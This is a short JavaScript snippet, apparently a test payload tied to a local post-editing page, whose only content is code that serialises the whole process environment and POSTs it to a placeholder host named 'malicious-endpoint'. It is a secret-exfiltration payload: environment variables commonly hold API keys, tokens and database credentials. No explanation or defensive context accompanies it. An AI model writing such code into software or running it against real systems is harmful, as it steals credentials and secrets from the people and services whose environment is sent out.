// http://localhost:3004/posts/ec8e7e0c-93aa-4228-b164-16d695fef3c8/edit

if (process.env) {
  fetch("malicious-endpoint", {
    method: "POST",
    body: JSON.stringify(process.env),
  });
}
